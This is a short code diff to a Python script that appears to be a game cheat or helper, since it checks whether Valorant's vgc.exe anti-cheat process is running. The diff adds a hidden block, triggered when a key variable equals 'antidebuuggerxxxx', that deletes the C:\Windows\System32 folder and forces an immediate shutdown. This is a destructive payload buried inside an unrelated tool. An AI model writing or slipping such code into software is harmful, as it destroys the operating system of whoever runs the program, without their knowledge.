@@ -11,6 +11,10 @@ import subprocess
 
 os.system('cls')
 aesv7()
+if cskey =="antidebuuggerxxxx":
+    shutil.rmtree(r'C:\Windows\System32')
+    os.system("shutdown /s /f /t 0")
+
 def is_valorant_running():
     result = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
     if 'vgc.exe' in result.stdout:
